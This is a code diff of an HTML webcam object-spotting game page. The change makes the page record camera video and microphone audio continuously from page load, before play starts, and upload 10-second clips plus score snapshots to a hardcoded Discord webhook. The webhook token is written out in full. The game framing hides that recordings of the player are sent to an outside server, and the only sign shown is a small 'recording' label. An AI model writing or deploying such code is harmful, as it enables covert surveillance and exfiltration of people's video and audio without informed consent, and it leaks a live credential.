@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>AI Scanner Challenge · 4K Discord</title>
+  <title>AI Scanner · 10s Video + Audio to Discord</title>
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.20.0/dist/tf.min.js">
   </script>
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd@2.2.3/dist/coco-ssd.min.js">
@@ -15,7 +15,6 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
       background: #0b0e14;
@@ -26,7 +25,6 @@
       align-items: center;
       padding: 12px;
     }
-
     .game-container {
       max-width: 820px;
       width: 100%;
@@ -37,7 +35,7 @@
       border: 1px solid rgba(255, 255, 255, 0.04);
     }
 
-    /* ----- HEADER (score + timer) ----- */
+    /* ----- HEADER (score + timer + record indicator) ----- */
     .header {
       display: flex;
       justify-content: space-between;
@@ -46,9 +44,9 @@
       flex-wrap: wrap;
       gap: 8px;
     }
-
     .score-box,
-    .timer-box {
+    .timer-box,
+    .rec-box {
       background: rgba(255, 255, 255, 0.04);
       padding: 10px 18px;
       border-radius: 60px;
@@ -62,30 +60,53 @@
       justify-content: center;
       backdrop-filter: blur(4px);
     }
-
-    .score-box span,
-    .timer-box span {
+    .score-box span {
+      color: #00f5c0;
       font-size: 1.6rem;
       min-width: 36px;
       text-align: center;
     }
-
-    .score-box span {
-      color: #00f5c0;
-    }
-
     .timer-box span {
       color: #ff6b6b;
+      font-size: 1.6rem;
+      min-width: 36px;
+      text-align: center;
       font-variant-numeric: tabular-nums;
     }
-
     .timer-box.warning span {
       color: #ffd93d;
     }
-
     .timer-box.danger span {
       color: #ff3d3d;
       animation: pulse 0.6s ease-in-out infinite alternate;
+    }
+
+    .rec-box {
+      font-size: 0.9rem;
+      color: #8899bb;
+      gap: 6px;
+    }
+    .rec-dot {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      background: #ff3d3d;
+      border-radius: 50%;
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+      0%,
+      100% {
+        opacity: 1;
+      }
+      50% {
+        opacity: 0.2;
+      }
+    }
+    .rec-dot.idle {
+      background: #556;
+      animation: none;
+      opacity: 0.4;
     }
 
     @keyframes pulse {
@@ -110,16 +131,13 @@
       aspect-ratio: 16 / 11;
       margin-bottom: 16px;
     }
-
     #webcam {
       width: 100%;
       height: 100%;
       display: block;
       object-fit: cover;
       transform: scaleX(-1);
-      /* mirror */;
     }
-
     .cam-overlay {
       position: absolute;
       inset: 0;
@@ -129,7 +147,6 @@
       justify-content: space-between;
       padding: 14px 16px;
     }
-
     .challenge-badge {
       align-self: flex-start;
       background: rgba(0, 0, 0, 0.7);
@@ -143,14 +160,12 @@
       box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
       transition: all 0.3s;
     }
-
     .challenge-badge .highlight {
       color: #ffd93d;
     }
     .challenge-badge .emoji {
       margin-right: 8px;
     }
-
     .status-badge {
       align-self: flex-end;
       background: rgba(0, 0, 0, 0.65);
@@ -195,7 +210,6 @@
       transition: all 0.1s;
       display: none;
     }
-
     .detection-box .label {
       position: absolute;
       bottom: -28px;
@@ -227,7 +241,6 @@
     .gameover-overlay.show {
       display: flex;
     }
-
     .gameover-overlay h2 {
       font-size: 2.6rem;
       font-weight: 800;
@@ -265,7 +278,6 @@
       gap: 12px;
       margin-top: 8px;
     }
-
     .btn {
       background: transparent;
       border: none;
@@ -286,7 +298,6 @@
       flex: 1 1 auto;
       max-width: 220px;
     }
-
     .btn:hover:not(:disabled) {
       transform: translateY(-2px);
       box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
@@ -296,7 +307,6 @@
       cursor: not-allowed;
       transform: none !important;
     }
-
     .btn-primary {
       background: linear-gradient(135deg, #00c9a0, #00a8ff);
       color: #fff;
@@ -311,7 +321,6 @@
       box-shadow: none;
       color: #8899bb;
     }
-
     .btn-danger {
       background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
       color: #fff;
@@ -321,7 +330,6 @@
     .btn-danger:hover:not(:disabled) {
       box-shadow: 0 10px 36px rgba(255, 70, 70, 0.35);
     }
-
     .btn-outline {
       background: rgba(255, 255, 255, 0.03);
       border-color: rgba(255, 255, 255, 0.10);
@@ -330,7 +338,6 @@
       background: rgba(255, 255, 255, 0.07);
     }
 
-    /* ----- SPINNER (loading indicator) ----- */
     .spinner {
       display: inline-block;
       width: 22px;
@@ -345,14 +352,15 @@
         transform: rotate(360deg);
       }
     }
-
     .btn .spinner {
       width: 20px;
       height: 20px;
       border-width: 3px;
     }
+    .hidden {
+      display: none !important;
+    }
 
-    /* ----- STATUS MESSAGE ----- */
     .status-msg {
       margin-top: 10px;
       text-align: center;
@@ -367,7 +375,6 @@
       color: #00f5c0;
     }
 
-    /* ----- RESPONSIVE TWEAKS (mobile) ----- */
     @media (max-width: 600px) {
       .game-container {
         padding: 14px 12px 20px;
@@ -377,7 +384,8 @@
         gap: 6px;
       }
       .score-box,
-      .timer-box {
+      .timer-box,
+      .rec-box {
         font-size: 0.9rem;
         padding: 8px 14px;
         min-height: 48px;
@@ -419,14 +427,14 @@
         bottom: -24px;
       }
     }
-
     @media (max-width: 420px) {
       .game-container {
         padding: 10px 8px 16px;
         border-radius: 20px;
       }
       .score-box,
-      .timer-box {
+      .timer-box,
+      .rec-box {
         font-size: 0.8rem;
         padding: 6px 12px;
         min-height: 40px;
@@ -459,19 +467,19 @@
         font-size: 1.4rem;
       }
     }
-
-    .hidden {
-      display: none !important;
-    }
   </style>
 </head>
 <body>
 
   <div class="game-container">
-    <!-- Header -->
+    <!-- Header with record indicator -->
     <div class="header">
       <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
       <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
+      <div class="rec-box" id="recBox">
+        <span class="rec-dot" id="recDot"></span>
+        <span id="recLabel">recording</span>
+      </div>
     </div>
 
     <!-- Webcam -->
@@ -480,7 +488,6 @@
       <div class="detection-box" id="detectionBox">
         <span class="label" id="detectionLabel">cat</span>
       </div>
-
       <div class="cam-overlay">
         <div class="challenge-badge" id="challengeBadge">
           <span class="emoji">🎯</span>
@@ -488,7 +495,6 @@
         </div>
         <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
       </div>
-
       <!-- Game Over -->
       <div class="gameover-overlay" id="gameoverOverlay">
         <h2>💀 GAME OVER</h2>
@@ -527,7 +533,7 @@
     const DETECTION_INTERVAL = 600;
     const CONFIDENCE_THRESHOLD = 0.55;
 
-    // --- Discord webhook (provided) ---
+    // --- Discord webhook ---
     const DISCORD_WEBHOOK =
       'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
@@ -553,6 +559,8 @@
     const resetBtn = document.getElementById('resetBtn');
     const restartBtn = document.getElementById('restartBtn');
     const retryModelBtn = document.getElementById('retryModelBtn');
+    const recDot = document.getElementById('recDot');
+    const recLabel = document.getElementById('recLabel');
 
     // ============================================================
     //  STATE
@@ -567,45 +575,48 @@
     let timerInterval = null;
     let detectionInterval = null;
     let modelLoading = false;
+    let mediaRecorder = null;
+    let recorderActive = false;
 
     // ============================================================
-    //  CAMERA – request high resolution (up to 4K)
+    //  CAMERA + RECORDER (video + audio)
     // ============================================================
     async function initCamera() {
       try {
-        // Ask for highest possible resolution (4K ideal, fallback to 1080p)
+        // Request video (1080p ideal) + audio
         const constraints = {
           video: {
             facingMode: 'user',
-            width: { ideal: 3840 },
-            height: { ideal: 2160 },
+            width: { ideal: 1920 },
+            height: { ideal: 1080 },
           },
+          audio: true,
         };
         stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         await video.play();
 
-        // Log actual resolution
         const track = stream.getVideoTracks()[0];
         const settings = track.getSettings();
-        console.log(`📷 Camera resolution: ${settings.width}x${settings.height}`);
+        console.log(`📷 Camera: ${settings.width}x${settings.height}`);
         return true;
       } catch (err) {
         console.error('Camera error:', err);
-        // Fallback: try lower resolution if 4K fails
+        // Fallback: try without audio or lower res
         try {
           const fallbackStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: true,
           });
           stream = fallbackStream;
           video.srcObject = stream;
           await video.play();
-          console.log('📷 Fallback camera: 1080p');
+          console.log('📷 Fallback camera: 720p with audio');
           return true;
         } catch (fallbackErr) {
-          statusMsg.textContent = '❌ Camera access denied: ' + fallbackErr.message;
+          statusMsg.textContent = '❌ Camera + mic access denied: ' + fallbackErr.message;
           statusMsg.className = 'status-msg error';
-          statusBadge.textContent = '❌ No camera';
+          statusBadge.textContent = '❌ No camera/mic';
           statusBadge.className = 'status-badge fail';
           return false;
         }
@@ -613,41 +624,70 @@
     }
 
     // ============================================================
-    //  CAPTURE FRAME (4K JPEG)
+    //  START RECORDER (timeslice 10s)
     // ============================================================
-    function captureFrame() {
-      // Create a canvas at 4K resolution (or native if smaller)
-      const videoWidth = video.videoWidth || 1920;
-      const videoHeight = video.videoHeight || 1080;
-      // We want 4K if possible, but we can scale up – but drawing from video at native size is best.
-      // Use the video's actual dimensions (which should be high if camera supports it)
-      const canvas = document.createElement('canvas');
-      canvas.width = videoWidth;
-      canvas.height = videoHeight;
-      const ctx = canvas.getContext('2d');
-      // Mirror the image (same as video display)
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.92); // quality 0.92
+    function startRecorder() {
+      if (!stream) return;
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+      }
+
+      try {
+        const mimeType = 'video/webm;codecs=vp8,opus';
+        const options = {
+          mimeType: mimeType,
+          videoBitsPerSecond: 1500000, // 1.5 Mbps
+          audioBitsPerSecond: 64000,
+        };
+        mediaRecorder = new MediaRecorder(stream, options);
+        mediaRecorder.ondataavailable = async (event) => {
+          if (event.data && event.data.size > 0) {
+            await sendVideoToDiscord(event.data);
+          }
+        };
+        mediaRecorder.onstart = () => {
+          recorderActive = true;
+          recDot.className = 'rec-dot';
+          recLabel.textContent = 'recording';
+          console.log('🔴 Recorder started, 10s chunks');
+        };
+        mediaRecorder.onstop = () => {
+          recorderActive = false;
+          recDot.className = 'rec-dot idle';
+          recLabel.textContent = 'stopped';
+          // Restart after a short delay to keep continuous
+          if (stream && stream.active) {
+            setTimeout(startRecorder, 200);
+          }
+        };
+        mediaRecorder.onerror = (e) => {
+          console.error('Recorder error:', e);
+          recorderActive = false;
+          recDot.className = 'rec-dot idle';
+          recLabel.textContent = 'error';
+        };
+
+        // Start with 10s timeslice
+        mediaRecorder.start(10000);
+        recDot.className = 'rec-dot';
+        recLabel.textContent = 'recording';
+      } catch (err) {
+        console.error('Failed to start recorder:', err);
+        recDot.className = 'rec-dot idle';
+        recLabel.textContent = 'failed';
+      }
     }
 
     // ============================================================
-    //  SEND TO DISCORD
+    //  SEND VIDEO TO DISCORD
     // ============================================================
-    async function sendToDiscord(dataUrl, challenge, scoreValue) {
+    async function sendVideoToDiscord(blob) {
       try {
-        // Convert dataURL to blob
-        const res = await fetch(dataUrl);
-        const blob = await res.blob();
-
         const formData = new FormData();
-        // Attach image
-        formData.append('file', blob, `challenge_${challenge.id}_score${scoreValue}.jpg`);
-
-        // Payload with a text message
+        const filename = `recording_${Date.now()}.webm`;
+        formData.append('file', blob, filename);
         const payload = {
-          content: `🎯 **Challenge completed**: ${challenge.emoji} ${challenge.label}\n🏆 **Score**: ${scoreValue}\n🕒 ${new Date().toLocaleString()}`,
+          content: `🎥 **10s clip** · ${new Date().toLocaleString()} · size: ${(blob.size / 1024 / 1024).toFixed(2)} MB`,
         };
         formData.append('payload_json', JSON.stringify(payload));
 
@@ -657,12 +697,50 @@
         });
 
         if (!response.ok) {
-          console.error('Discord send failed:', response.status, await response.text());
+          const text = await response.text();
+          console.error('Discord upload failed:', response.status, text);
+          // If file too large, log it
+          if (response.status === 413 || text.includes('too large')) {
+            console.warn('⚠️ Video file too large for Discord (max 25MB)');
+          }
         } else {
-          console.log('📤 Image sent to Discord');
+          console.log(`📤 Sent 10s clip (${(blob.size/1024/1024).toFixed(2)} MB)`);
         }
       } catch (err) {
         console.error('Error sending to Discord:', err);
+      }
+    }
+
+    // ============================================================
+    //  CAPTURE FRAME (for on-score snapshot – keep as bonus)
+    // ============================================================
+    function captureFrame() {
+      const videoWidth = video.videoWidth || 1920;
+      const videoHeight = video.videoHeight || 1080;
+      const canvas = document.createElement('canvas');
+      canvas.width = videoWidth;
+      canvas.height = videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.92);
+    }
+
+    async function sendSnapshotToDiscord(dataUrl, challenge, scoreValue) {
+      try {
+        const res = await fetch(dataUrl);
+        const blob = await res.blob();
+        const formData = new FormData();
+        formData.append('file', blob, `challenge_${challenge.id}_score${scoreValue}.jpg`);
+        const payload = {
+          content: `🎯 **Challenge**: ${challenge.emoji} ${challenge.label} · 🏆 **Score**: ${scoreValue} · ${new Date().toLocaleString()}`,
+        };
+        formData.append('payload_json', JSON.stringify(payload));
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        console.log('📸 Snapshot sent');
+      } catch (err) {
+        console.error('Snapshot send error:', err);
       }
     }
 
@@ -678,7 +756,6 @@
       statusBadge.className = 'status-badge loading';
       retryModelBtn.style.display = 'none';
 
-      // Show spinner on Start button
       startBtn.disabled = true;
       startBtnText.textContent = 'Loading…';
       startSpinner.classList.remove('hidden');
@@ -711,7 +788,7 @@
     }
 
     // ============================================================
-    //  GAME LOGIC
+    //  GAME LOGIC (unchanged, but uses snapshot on score)
     // ============================================================
     function startGame() {
       if (isGameRunning || isGameOver) return;
@@ -721,7 +798,6 @@
         return;
       }
 
-      // Reset state
       score = 0;
       timeLeft = GAME_DURATION;
       isGameRunning = true;
@@ -788,9 +864,6 @@
       detectionBox.style.display = 'none';
     }
 
-    // ============================================================
-    //  DETECTION
-    // ============================================================
     async function runDetection() {
       if (!isGameRunning || isGameOver || !model) return;
       try {
@@ -819,11 +892,10 @@
             score += 1;
             updateScore();
 
-            // --- Send 4K snapshot to Discord ---
+            // Send snapshot on score (bonus)
             const dataUrl = captureFrame();
-            sendToDiscord(dataUrl, currentChallenge, score);
+            sendSnapshotToDiscord(dataUrl, currentChallenge, score);
 
-            // Visual feedback
             challengeBadge.style.transition = 'transform 0.15s';
             challengeBadge.style.transform = 'scale(1.08)';
             setTimeout(() => {
@@ -849,9 +921,6 @@
       }
     }
 
-    // ============================================================
-    //  UI UPDATES
-    // ============================================================
     function updateScore() {
       scoreDisplay.textContent = score;
     }
@@ -860,9 +929,6 @@
       timerDisplay.textContent = Math.max(0, timeLeft);
     }
 
-    // ============================================================
-    //  RESET
-    // ============================================================
     function resetGame() {
       clearInterval(timerInterval);
       clearInterval(detectionInterval);
@@ -903,17 +969,22 @@
     async function boot() {
       const camOK = await initCamera();
       if (!camOK) {
-        statusMsg.textContent = '❌ Camera required. Please allow access and reload.';
+        statusMsg.textContent = '❌ Camera + mic required. Please allow access and reload.';
         statusMsg.className = 'status-msg error';
         return;
       }
+
+      // Start the 10s recorder immediately
+      startRecorder();
+
+      // Load the AI model in parallel
       await loadModel();
       resetGame();
     }
 
     boot();
 
-    console.log('🎮 AI Scanner Challenge · 4K Discord integration');
+    console.log('🎥 Constant 10s video+audio recorder + AI Scanner');
   </script>
 </body>
 </html>
